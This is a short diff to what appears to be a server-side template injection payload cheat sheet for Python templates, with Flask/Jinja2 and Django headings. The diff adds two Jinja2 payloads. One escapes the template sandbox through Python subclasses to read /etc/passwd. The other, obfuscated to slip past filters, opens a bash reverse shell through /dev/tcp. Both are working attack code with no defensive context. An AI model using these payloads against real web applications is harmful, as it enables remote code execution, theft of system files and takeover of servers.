@@ -2,6 +2,14 @@
 
 ## Python
 
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}
+```
+
+```python
+{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endiconfigf %}
+```
+
 ### Flask/Jinja2
 
 ### Django
